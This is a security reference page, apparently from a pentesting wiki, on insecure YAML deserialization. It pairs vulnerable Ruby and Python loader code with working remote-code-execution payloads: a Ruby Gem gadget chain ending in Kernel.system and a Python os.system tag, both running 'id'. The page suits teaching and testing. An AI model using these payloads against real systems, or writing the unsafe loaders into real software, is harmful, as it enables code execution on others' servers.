---
description: Yet Another Markup Language
---

# YAML

## Description

First of all, a great article explaining all sorts of tricks and weirdness in YAML:

{% embed url="https://ruudvanasseldonk.com/2023/01/11/the-yaml-document-from-hell" %}
Explanation and examples of many YAML tricks
{% endembed %}

## Insecure Deserialization

In YAML the `!` character can mean a **tag**, which allows you to execute a function in the host language with a parameter that comes right after (because why not). Many parsers implement this as it is required by the spec, but if attackers have control over the YAML file, even partially, they can use these tags to run arbitrary functions with arbitrary arguments.&#x20;

A common target for this is function that execute shell commands, where you can gain Remote Code Execution. The following examples all execute the `id` command and allow you to execute any arbitrary commands:

### Ruby

#### Vulnerable Function

```ruby
require "yaml"

YAML.load(File.read("data.yml"))
```

#### Payload (>2.7, [source](https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/))

{% code title="data.yml" %}
```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "id"
         method_id: :resolve
```
{% endcode %}

### Python

#### Vulnerable Function

```python
from yaml import Loader, load

deserialized = load(open('data.yml'), Loader=Loader)
```

#### Payload

```yaml
!!python/object/apply:os.system
- "id"
```
